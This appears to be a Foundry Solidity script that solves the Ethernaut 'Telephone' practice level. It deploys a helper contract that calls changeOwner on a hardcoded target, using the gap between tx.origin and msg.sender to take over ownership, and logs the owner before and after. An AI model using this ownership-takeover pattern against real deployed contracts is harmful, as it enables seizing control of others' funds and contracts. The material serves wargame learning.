// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/4_Telephone.sol";

contract Helper {
    Telephone public target = Telephone(0xbF9CE619807E084e65616b42b560dBd7cCEd3E87);

    function exploit() external {
        target.changeOwner(0xde90dD6033BFA475e3d517ec882c253B4E6D8B64);
    }
}

contract POC is Script {
    Telephone public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Telephone(0xbF9CE619807E084e65616b42b560dBd7cCEd3E87);

        address owner = target.owner();
        console.log("before owner: ", owner);

        Helper helper = new Helper();
        helper.exploit();

        owner = target.owner();
        console.log("after owner: ", owner);

        vm.stopBroadcast();
    }
}